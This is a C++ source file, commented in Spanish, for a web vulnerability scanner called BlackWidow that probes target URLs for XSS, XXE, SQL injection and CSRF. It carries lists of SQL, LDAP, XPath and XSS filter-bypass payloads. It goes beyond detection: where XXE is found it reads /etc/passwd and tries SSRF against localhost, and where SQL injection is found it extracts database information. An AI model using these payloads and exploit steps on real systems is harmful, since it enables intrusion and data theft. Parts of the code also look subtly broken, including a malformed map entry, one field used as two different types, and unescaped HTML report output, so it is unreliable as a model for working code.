/**
 * SecurityAnalyzer.cpp
 * Implementación de la clase principal que integra todos los analizadores de seguridad
 */

#include "SecurityAnalyzer.h"
#include <chrono>
#include <iomanip>
#include <sstream>
#include <algorithm>

namespace BlackWidow {
namespace Security {
namespace Analyzer {

/**
 * Constructor
 */
SecurityAnalyzer::SecurityAnalyzer() {
    // Inicializar los analizadores individuales
    xssAnalyzer = std::make_unique<XssAnalyzer>();
    xxeAnalyzer = std::make_unique<XxeAnalyzer>();
    sqlAnalyzer = std::make_unique<SqlInjectionAnalyzer>();
    csrfAnalyzer = std::make_unique<CsrfAnalyzer>();
}

/**
 * Realiza un análisis completo de seguridad en un objetivo
 */
SecurityAnalysisReport SecurityAnalyzer::analyzeTarget(
    const std::string& url, 
    const std::vector<VulnerabilityType>& vulnerabilityTypes,
    const std::map<std::string, std::string>& headers) {
    
    SecurityAnalysisReport report;
    report.targetUrl = url;
    report.scanDate = getCurrentDateTime();
    
    // Verificar si se debe analizar todas las vulnerabilidades
    bool analyzeAll = false;
    for (const auto& type : vulnerabilityTypes) {
        if (type == VulnerabilityType::ALL) {
            analyzeAll = true;
            break;
        }
    }
    
    // Analizar XSS si está especificado o si se analizan todas
    if (analyzeAll || std::find(vulnerabilityTypes.begin(), vulnerabilityTypes.end(), 
                               VulnerabilityType::XSS) != vulnerabilityTypes.end()) {
        // Crear múltiples parámetros de prueba para XSS con diferentes contextos
        std::vector<std::map<std::string, std::string>> xssTestCases = {
            // Parámetros de búsqueda comunes
            {{"q", "test"}, {"search", "test"}, {"query", "test"}},
            // Parámetros de identificación
            {{"id", "1"}, {"user_id", "1"}, {"product_id", "1"}},
            // Parámetros de entrada de texto
            {{"name", "test"}, {"title", "test"}, {"description", "test"}},
            // Parámetros de comentarios y mensajes
            {{"comment", "test"}, {"message", "test"}, {"content", "test"}},
            // Parámetros de URL y redirección
            {{"url", "http://example.com"}, {"redirect", "/home"}, {"callback", "function"}},
            // Parámetros de filtros y ordenamiento
            {{"filter", "all"}, {"sort", "name"}, {"order", "asc"}},
            // Parámetros de formularios
            {{"email", "test@example.com"}, {"phone", "123456789"}, {"address", "test address"}}
        };
        
        for (const auto& params : xssTestCases) {
            XssAnalysisResult xssResult = xssAnalyzer->detectVulnerability(url, params, headers);
            if (xssResult.vulnerable) {
                report.xssResults.push_back(xssResult);
            }
        }
    }
    
    // Analizar XXE si está especificado o si se analizan todas
    if (analyzeAll || std::find(vulnerabilityTypes.begin(), vulnerabilityTypes.end(), 
                               VulnerabilityType::XXE) != vulnerabilityTypes.end()) {
        XxeAnalysisResult xxeResult = xxeAnalyzer->detectVulnerability(url, headers);
        if (xxeResult.vulnerable) {
            report.xxeResults.push_back(xxeResult);
        }
    }
    
    // Analizar SQL Injection si está especificado o si se analizan todas
    if (analyzeAll || std::find(vulnerabilityTypes.begin(), vulnerabilityTypes.end(), 
                               VulnerabilityType::SQL_INJECTION) != vulnerabilityTypes.end()) {
        // Crear múltiples parámetros de prueba para SQL Injection con diferentes contextos
        std::vector<std::map<std::string, std::string>> sqlTestCases = {
            // Parámetros numéricos (más comunes para SQLi)
            {{"id", "1"}, {"user_id", "1"}, {"product_id", "1"}},
            // Parámetros de autenticación
            {{"username", "admin"}, {"password", "password"}, {"email", "admin@example.com"}},
            // Parámetros de búsqueda y filtros
            {{"search", "test"}, {"category", "electronics"}, {"brand", "samsung"}},
            // Parámetros de ordenamiento y paginación
            {{"order_by", "name"}, {"limit", "10"}, {"offset", "0"}},
            // Parámetros de fechas y rangos
            {{"start_date", "2023-01-01"}, {"end_date", "2023-12-31"}, {"year", "2023"}},
            // Parámetros de configuración
            {{"status", "active"}, {"type", "premium"}, {"role", "user"}},
            // Parámetros de localización
            {{"country", "US"}, {"city", "New York"}, {"zip", "10001"}},
            // Parámetros de API
            {{"api_key", "test123"}, {"token", "abc123"}, {"session_id", "sess123"}}
        };
        
        for (const auto& params : sqlTestCases) {
            SqlInjectionAnalysisResult sqlResult = sqlAnalyzer->detectVulnerability(url, params, headers);
            if (sqlResult.vulnerable) {
                report.sqlResults.push_back(sqlResult);
            }
        }
    }
    
    // Analizar CSRF si está especificado o si se analizan todas
    if (analyzeAll || std::find(vulnerabilityTypes.begin(), vulnerabilityTypes.end(), 
                               VulnerabilityType::CSRF) != vulnerabilityTypes.end()) {
        CsrfAnalysisResult csrfResult = csrfAnalyzer->detectVulnerability(url, headers);
        if (csrfResult.vulnerable) {
            report.csrfResults.push_back(csrfResult);
        }
    }
    
    // Actualizar estadísticas del informe
    updateReportStatistics(report);
    
    return report;
}

/**
 * Analiza un formulario en busca de vulnerabilidades XSS y CSRF
 */
SecurityAnalysisReport SecurityAnalyzer::analyzeForm(
    const std::string& url,
    const std::map<std::string, std::string>& headers) {
    
    SecurityAnalysisReport report;
    report.targetUrl = url;
    report.scanDate = getCurrentDateTime();
    
    // Analizar CSRF en el formulario
    CsrfAnalysisResult csrfResult = csrfAnalyzer->detectVulnerability(url, headers);
    if (csrfResult.vulnerable) {
        report.csrfResults.push_back(csrfResult);
    }
    
    // Extraer campos del formulario para probar XSS
    // Nota: En una implementación real, se extraerían los campos del formulario
    // Para esta implementación, usamos múltiples casos de prueba para formularios
    std::vector<std::map<std::string, std::string>> formTestCases = {
        // Campos de información personal
        {{"name", "test"}, {"firstname", "John"}, {"lastname", "Doe"}},
        // Campos de contacto
        {{"email", "test@example.com"}, {"phone", "123-456-7890"}, {"address", "123 Main St"}},
        // Campos de contenido y comentarios
        {{"comment", "test comment"}, {"message", "test message"}, {"feedback", "test feedback"}},
        // Campos de perfil y biografía
        {{"bio", "test bio"}, {"description", "test description"}, {"about", "test about"}},
        // Campos de configuración
        {{"title", "test title"}, {"subject", "test subject"}, {"topic", "test topic"}},
        // Campos de búsqueda en formularios
        {{"search_query", "test"}, {"keywords", "test keywords"}, {"tags", "test,tags"}},
        // Campos de URL y enlaces
        {{"website", "http://example.com"}, {"profile_url", "http://profile.com"}, {"social_link", "http://social.com"}},
        // Campos de archivos y uploads
        {{"filename", "test.txt"}, {"file_description", "test file"}, {"upload_notes", "test notes"}},
        // Campos de fechas y eventos
        {{"event_name", "test event"}, {"event_description", "test event desc"}, {"location", "test location"}},
        // Campos de productos y servicios
        {{"product_name", "test product"}, {"product_description", "test desc"}, {"price", "99.99"}}
    };
    
    // Analizar XSS en todos los casos de prueba del formulario
    for (const auto& params : formTestCases) {
        XssAnalysisResult xssResult = xssAnalyzer->detectVulnerability(url, params, headers);
        if (xssResult.vulnerable) {
            report.xssResults.push_back(xssResult);
        }
    }
    
    // Actualizar estadísticas del informe
    updateReportStatistics(report);
    
    return report;
}

/**
 * Analiza un endpoint XML en busca de vulnerabilidades XXE
 */
SecurityAnalysisReport SecurityAnalyzer::analyzeXmlEndpoint(
    const std::string& url,
    const std::map<std::string, std::string>& headers) {
    
    SecurityAnalysisReport report;
    report.targetUrl = url;
    report.scanDate = getCurrentDateTime();
    
    // Analizar XXE en el endpoint XML
    XxeAnalysisResult xxeResult = xxeAnalyzer->detectVulnerability(url, headers);
    if (xxeResult.vulnerable) {
        report.xxeResults.push_back(xxeResult);
        
        // Si es vulnerable, intentar explotar para leer archivos
        XxeAnalysisResult fileReadResult = xxeAnalyzer->exploitFileRead(url, "/etc/passwd", headers);
        if (fileReadResult.vulnerable) {
            report.xxeResults.push_back(fileReadResult);
        }
        
        // Intentar SSRF a través de XXE
        XxeAnalysisResult ssrfResult = xxeAnalyzer->exploitSsrf(url, "http://localhost:8080", headers);
        if (ssrfResult.vulnerable) {
            report.xxeResults.push_back(ssrfResult);
        }
    }
    
    // Actualizar estadísticas del informe
    updateReportStatistics(report);
    
    return report;
}

/**
 * Analiza un endpoint de API en busca de vulnerabilidades de inyección
 */
SecurityAnalysisReport SecurityAnalyzer::analyzeApiEndpoint(
    const std::string& url,
    const std::map<std::string, std::string>& params,
    const std::map<std::string, std::string>& headers) {
    
    SecurityAnalysisReport report;
    report.targetUrl = url;
    report.scanDate = getCurrentDateTime();
    
    // Crear casos de prueba adicionales para APIs con parámetros comunes
    std::vector<std::map<std::string, std::string>> apiTestCases = {
        // Parámetros originales del usuario
        params,
        // Parámetros de autenticación y autorización
        {{"api_key", "test123"}, {"token", "bearer_token"}, {"auth", "admin"}},
        // Parámetros de consulta de datos
        {{"user_id", "1"}, {"account_id", "123"}, {"customer_id", "456"}},
        // Parámetros de filtrado y búsqueda
        {{"filter", "active"}, {"search", "test"}, {"query", "SELECT * FROM users"}},
        // Parámetros de paginación y ordenamiento
        {{"page", "1"}, {"limit", "10"}, {"sort", "name"}, {"order", "ASC"}},
        // Parámetros de configuración
        {{"config", "production"}, {"env", "dev"}, {"debug", "true"}},
        // Parámetros de archivos y recursos
        {{"file_id", "123"}, {"resource", "users"}, {"path", "/etc/passwd"}},
        // Parámetros de fechas y tiempo
        {{"start_date", "2023-01-01"}, {"end_date", "2023-12-31"}, {"timestamp", "1234567890"}},
        // Parámetros de formato y respuesta
        {{"format", "json"}, {"callback", "jsonp_callback"}, {"output", "xml"}}
    };
    
    // Analizar SQL Injection en todos los casos de prueba
    for (const auto& testParams : apiTestCases) {
        SqlInjectionAnalysisResult sqlResult = sqlAnalyzer->detectVulnerability(url, testParams, headers);
        if (sqlResult.vulnerable) {
            report.sqlResults.push_back(sqlResult);
            
            // Si es vulnerable, intentar detectar el tipo de base de datos
            if (!testParams.empty()) {
                std::string vulnerableParam = testParams.begin()->first;
                Payloads::DatabaseType dbType = sqlAnalyzer->detectDatabaseType(url, vulnerableParam, headers);
                
                // Extraer información de la base de datos
                SqlInjectionAnalysisResult dbInfoResult = sqlAnalyzer->extractDatabaseInfo(
                    url, vulnerableParam, dbType, headers);
                if (dbInfoResult.vulnerable) {
                    report.sqlResults.push_back(dbInfoResult);
                }
                
                // Probar inyección SQL ciega
                SqlInjectionAnalysisResult blindResult = sqlAnalyzer->detectBlindInjection(url, testParams, headers);
                if (blindResult.vulnerable) {
                    report.sqlResults.push_back(blindResult);
                }
            }
        }
    }
    
    // Analizar XSS en todos los casos de prueba
    for (const auto& testParams : apiTestCases) {
        XssAnalysisResult xssResult = xssAnalyzer->detectVulnerability(url, testParams, headers);
        if (xssResult.vulnerable) {
            report.xssResults.push_back(xssResult);
        }
    }
    
    // Casos especiales para APIs JSON/XML
    if (headers.find("Content-Type") != headers.end()) {
        std::string contentType = headers.at("Content-Type");
        
        // Si es una API XML, probar XXE
        if (contentType.find("xml") != std::string::npos) {
            XxeAnalysisResult xxeResult = xxeAnalyzer->detectVulnerability(url, headers);
            if (xxeResult.vulnerable) {
                report.xxeResults.push_back(xxeResult);
                
                // Intentar explotar XXE para lectura de archivos
                XxeAnalysisResult fileReadResult = xxeAnalyzer->exploitFileRead(url, "/etc/passwd", headers);
                if (fileReadResult.vulnerable) {
                    report.xxeResults.push_back(fileReadResult);
                }
            }
        }
        
        // Si es una API que acepta callbacks (JSONP), probar XSS
        if (contentType.find("javascript") != std::string::npos || 
            params.find("callback") != params.end()) {
            std::map<std::string, std::string> jsonpParams = {{"callback", "alert(1)"}};
            XssAnalysisResult jsonpResult = xssAnalyzer->detectVulnerability(url, jsonpParams, headers);
            if (jsonpResult.vulnerable) {
                report.xssResults.push_back(jsonpResult);
            }
        }
    }
    
    // Actualizar estadísticas del informe
    updateReportStatistics(report);
    
    return report;
}

/**
 * Genera un informe en formato HTML del análisis de seguridad
 */
std::string SecurityAnalyzer::generateHtmlReport(const SecurityAnalysisReport& report) {
    std::stringstream html;
    
    // Encabezado HTML
    html << "<!DOCTYPE html>\n"
         << "<html lang=\"es\">\n"
         << "<head>\n"
         << "    <meta charset=\"UTF-8\">\n"
         << "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
         << "    <title>Informe de Seguridad - BlackWidow</title>\n"
         << "    <style>\n"
         << "        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }\n"
         << "        h1, h2, h3 { color: #333; }\n"
         << "        .container { max-width: 1200px; margin: 0 auto; }\n"
         << "        .header { background-color: #f5f5f5; padding: 20px; border-radius: 5px; margin-bottom: 20px; }\n"
         << "        .summary { display: flex; justify-content: space-between; margin-bottom: 20px; }\n"
         << "        .summary-box { background-color: #f9f9f9; padding: 15px; border-radius: 5px; width: 23%; text-align: center; }\n"
         << "        .critical { border-left: 5px solid #d9534f; }\n"
         << "        .high { border-left: 5px solid #f0ad4e; }\n"
         << "        .medium { border-left: 5px solid #5bc0de; }\n"
         << "        .low { border-left: 5px solid #5cb85c; }\n"
         << "        .vulnerability { background-color: #fff; border: 1px solid #ddd; padding: 15px; margin-bottom: 10px; border-radius: 5px; }\n"
         << "        .evidence { background-color: #f5f5f5; padding: 10px; border-radius: 3px; font-family: monospace; overflow-x: auto; }\n"
         << "    </style>\n"
         << "</head>\n"
         << "<body>\n"
         << "    <div class=\"container\">\n"
         << "        <div class=\"header\">\n"
         << "            <h1>Informe de Análisis de Seguridad</h1>\n"
         << "            <p><strong>URL Objetivo:</strong> " << report.targetUrl << "</p>\n"
         << "            <p><strong>Fecha de Análisis:</strong> " << report.scanDate << "</p>\n"
         << "        </div>\n";
    
    // Resumen de vulnerabilidades
    html << "        <div class=\"summary\">\n"
         << "            <div class=\"summary-box critical\">\n"
         << "                <h3>Críticas</h3>\n"
         << "                <h2>" << report.criticalVulnerabilities << "</h2>\n"
         << "            </div>\n"
         << "            <div class=\"summary-box high\">\n"
         << "                <h3>Altas</h3>\n"
         << "                <h2>" << report.highVulnerabilities << "</h2>\n"
         << "            </div>\n"
         << "            <div class=\"summary-box medium\">\n"
         << "                <h3>Medias</h3>\n"
         << "                <h2>" << report.mediumVulnerabilities << "</h2>\n"
         << "            </div>\n"
         << "            <div class=\"summary-box low\">\n"
         << "                <h3>Bajas</h3>\n"
         << "                <h2>" << report.lowVulnerabilities << "</h2>\n"
         << "            </div>\n"
         << "        </div>\n";
    
    // Sección de vulnerabilidades XSS
    if (!report.xssResults.empty()) {
        html << "        <h2>Vulnerabilidades XSS</h2>\n";
        for (const auto& result : report.xssResults) {
            html << "        <div class=\"vulnerability\">\n"
                 << "            <h3>" << result.vulnerabilityType << " (Impacto: " << result.impactLevel << "/5)</h3>\n"
                 << "            <p><strong>Contexto:</strong> " << result.context << "</p>\n"
                 << "            <p><strong>Payload:</strong> " << result.payload << "</p>\n"
                 << "            <div class=\"evidence\">\n"
                 << "                <p><strong>Evidencia:</strong></p>\n"
                 << "                <pre>" << result.evidence << "</pre>\n"
                 << "            </div>\n"
                 << "        </div>\n";
        }
    }
    
    // Sección de vulnerabilidades XXE
    if (!report.xxeResults.empty()) {
        html << "        <h2>Vulnerabilidades XXE</h2>\n";
        for (const auto& result : report.xxeResults) {
            html << "        <div class=\"vulnerability\">\n"
                 << "            <h3>" << result.vulnerabilityType << "</h3>\n"
                 << "            <p><strong>Payload:</strong> " << result.payload << "</p>\n"
                 << "            <div class=\"evidence\">\n"
                 << "                <p><strong>Evidencia:</strong></p>\n"
                 << "                <pre>" << result.evidence << "</pre>\n"
                 << "            </div>\n";
            
            // Mostrar datos extraídos si hay
            if (!result.extractedData.empty()) {
                html << "            <div class=\"evidence\">\n"
                     << "                <p><strong>Datos Extraídos:</strong></p>\n";
                for (const auto& data : result.extractedData) {
                    html << "                <p>" << data.first << ": " << data.second << "</p>\n";
                }
                html << "            </div>\n";
            }
            
            html << "        </div>\n";
        }
    }
    
    // Sección de vulnerabilidades SQL Injection
    if (!report.sqlResults.empty()) {
        html << "        <h2>Vulnerabilidades de Inyección SQL</h2>\n";
        for (const auto& result : report.sqlResults) {
            html << "        <div class=\"vulnerability\">\n"
                 << "            <h3>" << result.vulnerabilityType << " (Impacto: " << result.impactLevel << "/5)</h3>\n"
                 << "            <p><strong>Base de Datos:</strong> " << result.databaseType << "</p>\n"
                 << "            <p><strong>Payload:</strong> " << result.payload << "</p>\n"
                 << "            <div class=\"evidence\">\n"
                 << "                <p><strong>Evidencia:</strong></p>\n"
                 << "                <pre>" << result.evidence << "</pre>\n"
                 << "            </div>\n";
            
            // Mostrar datos extraídos si hay
            if (!result.extractedData.empty()) {
                html << "            <div class=\"evidence\">\n"
                     << "                <p><strong>Datos Extraídos:</strong></p>\n";
                for (const auto& data : result.extractedData) {
                    html << "                <p>" << data.first << ": " << data.second << "</p>\n";
                }
                html << "            </div>\n";
            }
            
            html << "        </div>\n";
        }
    }
    
    // Sección de vulnerabilidades CSRF
    if (!report.csrfResults.empty()) {
        html << "        <h2>Vulnerabilidades CSRF</h2>\n";
        for (const auto& result : report.csrfResults) {
            html << "        <div class=\"vulnerability\">\n"
                 << "            <h3>" << result.vulnerabilityType << " (Impacto: " << result.impactLevel << "/5)</h3>\n"
                 << "            <p><strong>Payload:</strong> " << result.payload << "</p>\n"
                 << "            <div class=\"evidence\">\n"
                 << "                <p><strong>Evidencia:</strong></p>\n"
                 << "                <pre>" << result.evidence << "</pre>\n"
                 << "            </div>\n";
            
            // Mostrar funcionalidades afectadas si hay
            if (!result.affectedFunctions.empty()) {
                html << "            <div class=\"evidence\">\n"
                     << "                <p><strong>Funcionalidades Afectadas:</strong></p>\n";
                for (const auto& func : result.affectedFunctions) {
                    html << "                <p>" << func.first << ": " << func.second << "</p>\n";
                }
                html << "            </div>\n";
            }
            
            html << "        </div>\n";
        }
    }
    
    // Pie de página
    html << "        <div class=\"footer\">\n"
         << "            <p>Generado por BlackWidow Security Analyzer</p>\n"
         << "        </div>\n"
         << "    </div>\n"
         << "</body>\n"
         << "</html>";
    
    return html.str();
}

/**
 * Genera un informe en formato JSON del análisis de seguridad
 */
std::string SecurityAnalyzer::generateJsonReport(const SecurityAnalysisReport& report) {
    std::stringstream json;
    
    json << "{\n";
    
    // Información general
    json << "  \"target_url\": \"" << escapeJsonString(report.targetUrl) << "\",\n";
    json << "  \"scan_date\": \"" << escapeJsonString(report.scanDate) << "\",\n";
    json << "  \"vulnerabilities_found\": " << (report.vulnerabilitiesFound ? "true" : "false") << ",\n";
    
    // Estadísticas
    json << "  \"statistics\": {\n";
    json << "    \"total_vulnerabilities\": " << report.totalVulnerabilities << ",\n";
    json << "    \"critical_vulnerabilities\": " << report.criticalVulnerabilities << ",\n";
    json << "    \"high_vulnerabilities\": " << report.highVulnerabilities << ",\n";
    json << "    \"medium_vulnerabilities\": " << report.mediumVulnerabilities << ",\n";
    json << "    \"low_vulnerabilities\": " << report.lowVulnerabilities << "\n";
    json << "  },\n";
    
    // Vulnerabilidades XSS
    json << "  \"xss_vulnerabilities\": [\n";
    for (size_t i = 0; i < report.xssResults.size(); ++i) {
        const auto& result = report.xssResults[i];
        json << "    {\n";
        json << "      \"vulnerable\": " << (result.vulnerable ? "true" : "false") << ",\n";
        json << "      \"vulnerability_type\": \"" << escapeJsonString(result.vulnerabilityType) << "\",\n";
        json << "      \"context\": \"" << escapeJsonString(result.context) << "\",\n";
        json << "      \"evidence\": \"" << escapeJsonString(result.evidence) << "\",\n";
        json << "      \"payload\": \"" << escapeJsonString(result.payload) << "\",\n";
        json << "      \"impact_level\": " << result.impactLevel << "\n";
        json << "    }" << (i < report.xssResults.size() - 1 ? "," : "") << "\n";
    }
    json << "  ],\n";
    
    // Vulnerabilidades XXE
    json << "  \"xxe_vulnerabilities\": [\n";
    for (size_t i = 0; i < report.xxeResults.size(); ++i) {
        const auto& result = report.xxeResults[i];
        json << "    {\n";
        json << "      \"vulnerable\": " << (result.vulnerable ? "true" : "false") << ",\n";
        json << "      \"vulnerability_type\": \"" << escapeJsonString(result.vulnerabilityType) << "\",\n";
        json << "      \"evidence\": \"" << escapeJsonString(result.evidence) << "\",\n";
        json << "      \"payload\": \"" << escapeJsonString(result.payload) << "\",\n";
        json << "      \"extracted_data\": {\n";
        size_t dataCount = 0;
        for (const auto& data : result.extractedData) {
            json << "        \"" << escapeJsonString(data.first) << "\": \"" << escapeJsonString(data.second) << "\"";
            if (++dataCount < result.extractedData.size()) json << ",";
            json << "\n";
        }
        json << "      }\n";
        json << "    }" << (i < report.xxeResults.size() - 1 ? "," : "") << "\n";
    }
    json << "  ],\n";
    
    // Vulnerabilidades SQL Injection
    json << "  \"sql_injection_vulnerabilities\": [\n";
    for (size_t i = 0; i < report.sqlResults.size(); ++i) {
        const auto& result = report.sqlResults[i];
        json << "    {\n";
        json << "      \"vulnerable\": " << (result.vulnerable ? "true" : "false") << ",\n";
        json << "      \"vulnerability_type\": \"" << escapeJsonString(result.vulnerabilityType) << "\",\n";
        json << "      \"database_type\": \"" << escapeJsonString(result.databaseType) << "\",\n";
        json << "      \"evidence\": \"" << escapeJsonString(result.evidence) << "\",\n";
        json << "      \"payload\": \"" << escapeJsonString(result.payload) << "\",\n";
        json << "      \"impact_level\": " << result.impactLevel << ",\n";
        json << "      \"extracted_data\": {\n";
        size_t dataCount = 0;
        for (const auto& data : result.extractedData) {
            json << "        \"" << escapeJsonString(data.first) << "\": \"" << escapeJsonString(data.second) << "\"";
            if (++dataCount < result.extractedData.size()) json << ",";
            json << "\n";
        }
        json << "      }\n";
        json << "    }" << (i < report.sqlResults.size() - 1 ? "," : "") << "\n";
    }
    json << "  ],\n";
    
    // Vulnerabilidades CSRF
    json << "  \"csrf_vulnerabilities\": [\n";
    for (size_t i = 0; i < report.csrfResults.size(); ++i) {
        const auto& result = report.csrfResults[i];
        json << "    {\n";
        json << "      \"vulnerable\": " << (result.vulnerable ? "true" : "false") << ",\n";
        json << "      \"vulnerability_type\": \"" << escapeJsonString(result.vulnerabilityType) << "\",\n";
        json << "      \"evidence\": \"" << escapeJsonString(result.evidence) << "\",\n";
        json << "      \"payload\": \"" << escapeJsonString(result.payload) << "\",\n";
        json << "      \"impact_level\": " << result.impactLevel << ",\n";
        json << "      \"affected_functions\": [\n";
        for (size_t j = 0; j < result.affectedFunctions.size(); ++j) {
            json << "        \"" << escapeJsonString(result.affectedFunctions[j]) << "\"";
            if (j < result.affectedFunctions.size() - 1) json << ",";
            json << "\n";
        }
        json << "      ]\n";
        json << "    }" << (i < report.csrfResults.size() - 1 ? "," : "") << "\n";
    }
    json << "  ]\n";
    
    json << "}";
    
    return json.str();
}

/**
 * Actualiza las estadísticas del informe basado en los resultados
 */
void SecurityAnalyzer::updateReportStatistics(SecurityAnalysisReport& report) {
    // Reiniciar contadores
    report.totalVulnerabilities = 0;
    report.criticalVulnerabilities = 0;
    report.highVulnerabilities = 0;
    report.mediumVulnerabilities = 0;
    report.lowVulnerabilities = 0;
    
    // Contar vulnerabilidades XSS
    for (const auto& result : report.xssResults) {
        report.totalVulnerabilities++;
        
        // Clasificar por nivel de impacto
        switch (result.impactLevel) {
            case 5:
                report.criticalVulnerabilities++;
                break;
            case 4:
                report.highVulnerabilities++;
                break;
            case 3:
                report.mediumVulnerabilities++;
                break;
            default: // 1-2
                report.lowVulnerabilities++;
                break;
        }
    }
    
    // Contar vulnerabilidades SQL Injection
    for (const auto& result : report.sqlResults) {
        report.totalVulnerabilities++;
        
        // Clasificar por nivel de impacto
        switch (result.impactLevel) {
            case 5:
                report.criticalVulnerabilities++;
                break;
            case 4:
                report.highVulnerabilities++;
                break;
            case 3:
                report.mediumVulnerabilities++;
                break;
            default: // 1-2
                report.lowVulnerabilities++;
                break;
        }
    }
    
    // Contar vulnerabilidades CSRF
    for (const auto& result : report.csrfResults) {
        report.totalVulnerabilities++;
        
        // Clasificar por nivel de impacto
        switch (result.impactLevel) {
            case 5:
                report.criticalVulnerabilities++;
                break;
            case 4:
                report.highVulnerabilities++;
                break;
            case 3:
                report.mediumVulnerabilities++;
                break;
            default: // 1-2
                report.lowVulnerabilities++;
                break;
        }
    }
    
    // Contar vulnerabilidades XXE (asumimos que todas son críticas)
    for (const auto& result : report.xxeResults) {
        report.totalVulnerabilities++;
        report.criticalVulnerabilities++; // XXE generalmente es crítico
    }
    
    // Actualizar el indicador de vulnerabilidades encontradas
    report.vulnerabilitiesFound = (report.totalVulnerabilities > 0);
}

/**
 * Realiza análisis avanzado de SQL injection con técnicas específicas
 */
SecurityAnalysisReport SecurityAnalyzer::performAdvancedSqlAnalysis(
    const std::string& url,
    const std::map<std::string, std::string>& params,
    const std::map<std::string, std::string>& headers) {
    
    SecurityAnalysisReport report;
    report.targetUrl = url;
    report.scanDate = getCurrentDateTime();
    
    // Técnicas avanzadas de SQL injection
    std::vector<std::pair<std::string, std::map<std::string, std::string>>> advancedSqlTests = {
        // Error-based injection
        {"Error-based", {{"id", "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1"}}},
        // Union-based injection
        {"Union-based", {{"id", "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"}}},
        // Boolean-based blind
        {"Boolean-blind", {{"id", "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--"}}},
        // Time-based blind
        {"Time-blind", {{"id", "1'; WAITFOR DELAY '00:00:05'--"}}},
        // Second-order injection
        {"Second-order", {{"username", "admin'--", "password", "password"}}},
        // NoSQL injection
        {"NoSQL", {{"id", "1'; return true; var x='"}}},
        // LDAP injection
        {"LDAP", {{"user", "*)(uid=*))(|(uid=*"}}},
        // XPath injection
        {"XPath", {{"search", "' or '1'='1' or ''='"}}}
    };
    
    for (const auto& test : advancedSqlTests) {
        SqlInjectionAnalysisResult result = sqlAnalyzer->detectVulnerability(url, test.second, headers);
        if (result.vulnerable) {
            result.vulnerabilityType = test.first + " SQL Injection";
            report.sqlResults.push_back(result);
        }
    }
    
    updateReportStatistics(report);
    return report;
}

/**
 * Realiza análisis avanzado de XSS con técnicas de evasión
 */
SecurityAnalysisReport SecurityAnalyzer::performAdvancedXssAnalysis(
    const std::string& url,
    const std::map<std::string, std::string>& params,
    const std::map<std::string, std::string>& headers) {
    
    // Suprimir advertencias de parámetros no utilizados
    (void)params;
    
    SecurityAnalysisReport report;
    report.targetUrl = url;
    report.scanDate = getCurrentDateTime();
    
    // Técnicas avanzadas de XSS con evasión
    std::vector<std::pair<std::string, std::map<std::string, std::string>>> advancedXssTests = {
        // XSS con codificación HTML
        {"HTML-encoded", {{"input", "&lt;script&gt;alert(1)&lt;/script&gt;"}}},
        // XSS con codificación URL
        {"URL-encoded", {{"input", "%3Cscript%3Ealert(1)%3C/script%3E"}}},
        // XSS con codificación hexadecimal
        {"Hex-encoded", {{"input", "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"}}},
        // XSS en atributos
        {"Attribute-based", {{"input", "\" onmouseover=\"alert(1)\" x=\""}}},
        // XSS con eventos JavaScript
        {"Event-based", {{"input", "<img src=x onerror=alert(1)>"}}},
        // XSS con SVG
        {"SVG-based", {{"input", "<svg onload=alert(1)>"}}},
        // XSS con CSS
        {"CSS-based", {{"input", "<style>@import'javascript:alert(1)';</style>"}}},
        // DOM XSS
        {"DOM-based", {{"fragment", "#<script>alert(1)</script>"}}},
        // XSS con filtros bypass
        {"Filter-bypass", {{"input", "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>"}}}
    };
    
    for (const auto& test : advancedXssTests) {
        XssAnalysisResult result = xssAnalyzer->detectVulnerability(url, test.second, headers);
        if (result.vulnerable) {
            result.vulnerabilityType = test.first + " XSS";
            report.xssResults.push_back(result);
        }
    }
    
    updateReportStatistics(report);
    return report;
}

/**
 * Escapa caracteres especiales para JSON
 */
std::string SecurityAnalyzer::escapeJsonString(const std::string& input) {
    std::string escaped;
    for (char c : input) {
        switch (c) {
            case '"': escaped += "\\\""; break;
            case '\\': escaped += "\\\\"; break;
            case '\b': escaped += "\\b"; break;
            case '\f': escaped += "\\f"; break;
            case '\n': escaped += "\\n"; break;
            case '\r': escaped += "\\r"; break;
            case '\t': escaped += "\\t"; break;
            default:
                if (c < 0x20) {
                    escaped += "\\u";
                    escaped += "0123456789abcdef"[(c >> 12) & 0xf];
                    escaped += "0123456789abcdef"[(c >> 8) & 0xf];
                    escaped += "0123456789abcdef"[(c >> 4) & 0xf];
                    escaped += "0123456789abcdef"[c & 0xf];
                } else {
                    escaped += c;
                }
                break;
        }
    }
    return escaped;
}

/**
 * Obtiene la fecha y hora actual en formato string
 */
std::string SecurityAnalyzer::getCurrentDateTime() {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

} // namespace Analyzer
} // namespace Security
} // namespace BlackWidow